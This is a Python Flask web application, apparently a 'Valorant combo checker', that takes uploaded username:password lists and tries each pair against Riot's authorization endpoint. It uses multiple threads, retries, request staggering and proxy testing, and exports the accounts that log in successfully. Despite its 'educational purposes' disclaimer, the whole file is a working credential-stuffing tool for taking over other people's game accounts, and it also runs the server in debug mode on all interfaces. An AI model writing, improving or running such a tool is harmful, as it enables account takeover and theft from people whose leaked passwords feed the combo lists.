#!/usr/bin/env python3
"""
Valorant Account Combo Checker - Web Application
A modern web-based tool for checking Valorant account combinations

DISCLAIMER: This tool is for educational purposes only.
Only use this tool on accounts you own or have explicit permission to test.
Unauthorized access to accounts is illegal and violates terms of service.
"""

from flask import Flask, render_template, request, jsonify, session
import requests
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional
import logging
import os
from werkzeug.utils import secure_filename
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

app = Flask(__name__)
app.secret_key = 'valorant_combo_checker_secret_key_' + str(uuid.uuid4())

# Configuration
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'csv'}
MAX_FILE_SIZE = 16 * 1024 * 1024  # 16MB

# Ensure upload folder exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Request settings
REQUEST_TIMEOUT = 30
MAX_RETRIES = 3
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
VALORANT_AUTH_URL = "https://auth.riotgames.com/api/v1/authorization"

# Multi-threading settings
DEFAULT_MAX_WORKERS = 5
MAX_WORKERS_LIMIT = 20

# Global storage for active sessions
active_sessions = {}

class ComboChecker:
    """Core combo checking functionality with multi-threading support"""
    
    def __init__(self, session_id: str, delay: float = 2.0, max_workers: int = DEFAULT_MAX_WORKERS):
        self.session_id = session_id
        self.delay = delay
        self.max_workers = min(max_workers, MAX_WORKERS_LIMIT)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': USER_AGENT,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        self.is_checking = False
        self.stop_checking = False
        self.results = []
        self.progress = {
            'current': 0, 
            'total': 0, 
            'rate': 0, 
            'eta': 0,
            'valid_count': 0,
            'invalid_count': 0,
            'error_count': 0,
            'success_rate': 0.0
        }
        self.results_lock = threading.Lock()
        self.progress_lock = threading.Lock()
        self.session_stats = {
            'start_time': None,
            'end_time': None,
            'total_processed': 0,
            'fastest_response': None,
            'slowest_response': None,
            'average_response_time': 0.0,
            'response_times': []
        }
        self.proxy_list = []
        self.current_proxy_index = 0
        self.proxy_rotation_enabled = False
        
    def check_single_combo(self, username: str, password: str) -> Dict:
        """Check a single username/password combination"""
        result = {
            'username': username,
            'password': password,
            'status': 'unknown',
            'message': '',
            'timestamp': time.time()
        }
        
        try:
            auth_data = {
                'type': 'auth',
                'username': username,
                'password': password,
                'remember': False
            }
            
            response = self._make_request(VALORANT_AUTH_URL, auth_data)
            
            if response is None:
                result['status'] = 'error'
                result['message'] = 'Request failed'
                return result
                
            if response.status_code == 200:
                response_data = response.json()
                
                if 'access_token' in response_data or response_data.get('type') == 'response':
                    result['status'] = 'valid'
                    result['message'] = 'Authentication successful'
                else:
                    result['status'] = 'invalid'
                    result['message'] = 'Invalid credentials'
                    
            elif response.status_code == 429:
                result['status'] = 'rate_limited'
                result['message'] = 'Rate limited - try again later'
                
            elif response.status_code in [400, 401, 403]:
                result['status'] = 'invalid'
                result['message'] = 'Invalid credentials'
                
            else:
                result['status'] = 'error'
                result['message'] = f'HTTP {response.status_code}'
                
        except requests.exceptions.Timeout:
            result['status'] = 'timeout'
            result['message'] = 'Request timed out'
            
        except requests.exceptions.ConnectionError:
            result['status'] = 'connection_error'
            result['message'] = 'Connection failed'
            
        except Exception as e:
            result['status'] = 'error'
            result['message'] = f'Unexpected error: {str(e)}'
            
        return result
    
    def _make_request(self, url: str, data: Dict) -> Optional[requests.Response]:
        """Make HTTP request with retry logic"""
        for attempt in range(MAX_RETRIES):
            try:
                response = self.session.post(
                    url,
                    json=data,
                    timeout=REQUEST_TIMEOUT
                )
                return response
                
            except requests.exceptions.RequestException:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2 ** attempt)
                    
        return None
    
    def check_combo_list(self, combos: List[Tuple[str, str]]):
        """Check a list of username/password combinations using multi-threading"""
        self.is_checking = True
        self.stop_checking = False
        self.results = []
        self.progress = {'current': 0, 'total': len(combos)}
        
        # Create thread pool for parallel processing
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all tasks
            future_to_combo = {}
            
            for i, (username, password) in enumerate(combos):
                if self.stop_checking:
                    break
                    
                future = executor.submit(self._check_combo_with_delay, username, password, i)
                future_to_combo[future] = (username, password, i)
            
            # Process completed tasks as they finish
            for future in as_completed(future_to_combo):
                if self.stop_checking:
                    # Cancel remaining futures
                    for f in future_to_combo:
                        f.cancel()
                    break
                
                try:
                    result = future.result()
                    
                    # Thread-safe result storage
                    with self.results_lock:
                        self.results.append(result)
                    
                    # Thread-safe progress update
                    with self.progress_lock:
                        self.progress['current'] = len(self.results)
                        
                except Exception as e:
                    # Handle any errors in individual threads
                    username, password, _ = future_to_combo[future]
                    error_result = {
                        'username': username,
                        'password': password,
                        'status': 'error',
                        'message': f'Thread error: {str(e)}',
                        'timestamp': time.time()
                    }
                    
                    with self.results_lock:
                        self.results.append(error_result)
                    
                    with self.progress_lock:
                        self.progress['current'] = len(self.results)
                
        self.is_checking = False
    
    def _check_combo_with_delay(self, username: str, password: str, index: int) -> Dict:
        """Check a single combo with smart delay management for threading"""
        start_request_time = time.time()
        
        # Stagger the start times to avoid overwhelming the server
        if index > 0:
            # Add a small random delay based on thread index to spread out requests
            thread_delay = (index % self.max_workers) * (self.delay / self.max_workers)
            time.sleep(thread_delay)
        
        result = self.check_single_combo(username, password)
        
        # Track response times for statistics
        response_time = time.time() - start_request_time
        result['response_time'] = round(response_time, 2)
        
        with self.progress_lock:
            self.session_stats['response_times'].append(response_time)
            if self.session_stats['fastest_response'] is None or response_time < self.session_stats['fastest_response']:
                self.session_stats['fastest_response'] = response_time
            if self.session_stats['slowest_response'] is None or response_time > self.session_stats['slowest_response']:
                self.session_stats['slowest_response'] = response_time
            
            # Update statistics
            if len(self.session_stats['response_times']) > 0:
                self.session_stats['average_response_time'] = sum(self.session_stats['response_times']) / len(self.session_stats['response_times'])
            
            # Update progress counters
            if result.get('status') == 'valid':
                self.progress['valid_count'] += 1
            elif result.get('status') == 'invalid':
                self.progress['invalid_count'] += 1
            else:
                self.progress['error_count'] += 1
            
            total_checked = self.progress['valid_count'] + self.progress['invalid_count'] + self.progress['error_count']
            if total_checked > 0:
                self.progress['success_rate'] = (self.progress['valid_count'] / total_checked) * 100
        
        # Apply the main delay between requests (but not for the first batch)
        if index >= self.max_workers:
            time.sleep(self.delay)
            
        return result
    
    def stop_checking_process(self):
        """Stop the current checking process"""
        self.stop_checking = True
        # Give some time for threads to finish gracefully
        time.sleep(0.5)

def allowed_file(filename):
    """Check if file extension is allowed"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def parse_combo_file(file_path: str) -> List[Tuple[str, str]]:
    """Parse combo file and return list of (username, password) tuples"""
    combos = []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for line_num, line in enumerate(file, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                    
                # Support multiple formats
                if ':' in line:
                    parts = line.split(':', 1)
                elif ',' in line:
                    parts = line.split(',', 1)
                elif ';' in line:
                    parts = line.split(';', 1)
                elif '\t' in line:
                    parts = line.split('\t', 1)
                else:
                    continue
                    
                if len(parts) == 2:
                    username = parts[0].strip()
                    password = parts[1].strip()
                    if username and password:
                        combos.append((username, password))
                        
    except Exception as e:
        raise Exception(f"Error reading file: {e}")
        
    return combos

@app.route('/')
def index():
    """Main page"""
    return render_template('index.html')

@app.route('/api/check_single', methods=['POST'])
def check_single():
    """API endpoint for single account check"""
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    
    if not username or not password:
        return jsonify({'error': 'Username and password are required'}), 400
    
    session_id = str(uuid.uuid4())
    checker = ComboChecker(session_id)
    result = checker.check_single_combo(username, password)
    
    return jsonify(result)

@app.route('/api/upload_file', methods=['POST'])
def upload_file():
    """API endpoint for file upload"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if file and file.filename and allowed_file(file.filename):
        filename = secure_filename(str(file.filename))
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        
        try:
            combos = parse_combo_file(file_path)
            session['uploaded_file'] = file_path
            session['combo_count'] = len(combos)
            
            return jsonify({
                'success': True,
                'filename': filename,
                'combo_count': len(combos)
            })
        except Exception as e:
            return jsonify({'error': f'Error parsing file: {str(e)}'}), 400
    
    return jsonify({'error': 'Invalid file type. Only .txt and .csv files are allowed'}), 400

@app.route('/api/start_batch', methods=['POST'])
def start_batch():
    """API endpoint to start batch checking with multi-threading"""
    data = request.get_json()
    delay = float(data.get('delay', 2.0))
    max_workers = int(data.get('max_workers', DEFAULT_MAX_WORKERS))
    
    # Validate max_workers
    max_workers = min(max_workers, MAX_WORKERS_LIMIT)
    max_workers = max(max_workers, 1)
    
    if 'uploaded_file' not in session:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file_path = session['uploaded_file']
    if not os.path.exists(file_path):
        return jsonify({'error': 'Uploaded file not found'}), 400
    
    try:
        combos = parse_combo_file(file_path)
        session_id = str(uuid.uuid4())
        
        checker = ComboChecker(session_id, delay, max_workers)
        active_sessions[session_id] = checker
        
        # Start checking in background thread
        def check_thread():
            checker.check_combo_list(combos)
        
        thread = threading.Thread(target=check_thread, daemon=True)
        thread.start()
        
        session['session_id'] = session_id
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'total_combos': len(combos),
            'max_workers': max_workers
        })
        
    except Exception as e:
        return jsonify({'error': f'Error starting batch check: {str(e)}'}), 500

@app.route('/api/batch_status/<session_id>')
def batch_status(session_id):
    """API endpoint to get batch checking status"""
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    checker = active_sessions[session_id]
    
    # Calculate real-time rate and ETA
    current_time = time.time()
    if checker.is_checking and hasattr(checker, 'start_time') and checker.start_time:
        elapsed = current_time - checker.start_time
        if elapsed > 0:
            rate = len(checker.results) / elapsed * 60  # per minute
            remaining = checker.progress['total'] - checker.progress['current']
            eta = (remaining / rate * 60) if rate > 0 else 0
            checker.progress['rate'] = round(rate, 1)
            checker.progress['eta'] = round(eta)
    
    return jsonify({
        'is_checking': checker.is_checking,
        'progress': checker.progress,
        'results': checker.results[-10:] if len(checker.results) > 10 else checker.results,  # Last 10 for live view
        'total_results': len(checker.results),
        'completed': not checker.is_checking and checker.progress['current'] > 0,
        'session_stats': {
            'fastest_response': round(checker.session_stats['fastest_response'], 2) if checker.session_stats['fastest_response'] else None,
            'slowest_response': round(checker.session_stats['slowest_response'], 2) if checker.session_stats['slowest_response'] else None,
            'average_response_time': round(checker.session_stats['average_response_time'], 2)
        }
    })

@app.route('/api/stop_batch/<session_id>', methods=['POST'])
def stop_batch(session_id):
    """API endpoint to stop batch checking"""
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    checker = active_sessions[session_id]
    checker.stop_checking_process()
    
    return jsonify({'success': True})

@app.route('/api/export_results/<session_id>')
def export_results(session_id):
    """Export results in various formats with enhanced statistics"""
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    checker = active_sessions[session_id]
    export_format = request.args.get('format', 'json').lower()
    
    if not checker.results:
        return jsonify({'error': 'No results to export'}), 400
    
    if export_format == 'csv':
        import csv
        import io
        
        output = io.StringIO()
        writer = csv.writer(output)
        
        # Write header
        writer.writerow(['Username', 'Password', 'Status', 'Message', 'Response Time (s)', 'Timestamp'])
        
        # Write data
        for result in checker.results:
            writer.writerow([
                result['username'],
                result['password'],
                result['status'],
                result['message'],
                result.get('response_time', ''),
                time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(result['timestamp']))
            ])
        
        output.seek(0)
        from flask import Response
        
        return Response(
            output.getvalue(),
            mimetype='text/csv',
            headers={'Content-Disposition': f'attachment; filename="valorant_results_{session_id[:8]}.csv"'}
        )
    
    elif export_format == 'txt':
        output_lines = []
        output_lines.append("=== VALORANT COMBO CHECKER RESULTS ===")
        output_lines.append(f"Session: {session_id}")
        output_lines.append(f"Total Checked: {len(checker.results)}")
        output_lines.append(f"Valid: {checker.progress['valid_count']}")
        output_lines.append(f"Invalid: {checker.progress['invalid_count']}")
        output_lines.append(f"Errors: {checker.progress['error_count']}")
        output_lines.append(f"Success Rate: {checker.progress['success_rate']:.1f}%")
        output_lines.append(f"Average Response Time: {checker.session_stats['average_response_time']:.2f}s")
        output_lines.append("")
        
        # Add valid accounts only
        valid_results = [r for r in checker.results if r['status'] == 'valid']
        if valid_results:
            output_lines.append("=== VALID ACCOUNTS ===")
            for result in valid_results:
                output_lines.append(f"{result['username']}:{result['password']}")
        else:
            output_lines.append("=== NO VALID ACCOUNTS FOUND ===")
        
        from flask import Response
        
        return Response(
            '\n'.join(output_lines),
            mimetype='text/plain',
            headers={'Content-Disposition': f'attachment; filename="valorant_valid_{session_id[:8]}.txt"'}
        )
    
    else:  # JSON format
        export_data = {
            'session_id': session_id,
            'export_timestamp': time.time(),
            'statistics': {
                'total_checked': len(checker.results),
                'valid_count': checker.progress['valid_count'],
                'invalid_count': checker.progress['invalid_count'],
                'error_count': checker.progress['error_count'],
                'success_rate': checker.progress['success_rate'],
                'average_response_time': checker.session_stats['average_response_time'],
                'fastest_response': checker.session_stats['fastest_response'],
                'slowest_response': checker.session_stats['slowest_response']
            },
            'results': checker.results
        }
        
        return jsonify(export_data)

# Advanced Features Routes

@app.route('/api/proxy_test')
def test_proxy():
    """Test proxy functionality"""
    proxy_url = request.args.get('proxy')
    if not proxy_url:
        return jsonify({'error': 'No proxy provided'}), 400
    
    try:
        proxies = {'http': proxy_url, 'https': proxy_url}
        response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=10)
        return jsonify({
            'success': True,
            'ip': response.json().get('origin'),
            'response_time': response.elapsed.total_seconds()
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/session_history')
def get_session_history():
    """Get history of all sessions"""
    history = []
    for session_id, checker in active_sessions.items():
        history.append({
            'session_id': session_id,
            'total_checked': len(checker.results),
            'valid_count': checker.progress.get('valid_count', 0),
            'success_rate': checker.progress.get('success_rate', 0),
            'is_active': checker.is_checking,
            'created': checker.session_stats.get('start_time')
        })
    
    return jsonify({'sessions': history})

@app.route('/api/duplicate_check', methods=['POST'])
def check_duplicates():
    """Check for duplicate combos in uploaded file"""
    if 'uploaded_file' not in session:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file_path = session['uploaded_file']
    try:
        combos = parse_combo_file(file_path)
        unique_combos = []
        seen = set()
        duplicates = []
        
        for username, password in combos:
            combo_key = f"{username}:{password}".lower()
            if combo_key in seen:
                duplicates.append(f"{username}:{password}")
            else:
                seen.add(combo_key)
                unique_combos.append((username, password))
        
        return jsonify({
            'total_combos': len(combos),
            'unique_combos': len(unique_combos),
            'duplicates_found': len(duplicates),
            'duplicate_list': duplicates[:10],  # First 10 duplicates
            'duplicate_percentage': (len(duplicates) / len(combos)) * 100 if combos else 0
        })
        
    except Exception as e:
        return jsonify({'error': f'Error checking duplicates: {str(e)}'}), 500

@app.route('/api/smart_retry/<session_id>', methods=['POST'])
def smart_retry(session_id):
    """Retry failed/error combos with smart logic"""
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    checker = active_sessions[session_id]
    if checker.is_checking:
        return jsonify({'error': 'Session is currently checking'}), 400
    
    # Find failed combos
    failed_combos = [
        (r['username'], r['password']) 
        for r in checker.results 
        if r['status'] in ['error', 'timeout']
    ]
    
    if not failed_combos:
        return jsonify({'error': 'No failed combos to retry'}), 400
    
    # Create new session for retry
    retry_session_id = f"{session_id}_retry_{int(time.time())}"
    retry_checker = ComboChecker(retry_session_id, checker.delay, checker.max_workers)
    active_sessions[retry_session_id] = retry_checker
    
    # Start retry in background
    def retry_thread():
        retry_checker.check_combo_list(failed_combos)
    
    thread = threading.Thread(target=retry_thread, daemon=True)
    thread.start()
    
    return jsonify({
        'success': True,
        'retry_session_id': retry_session_id,
        'retry_count': len(failed_combos)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)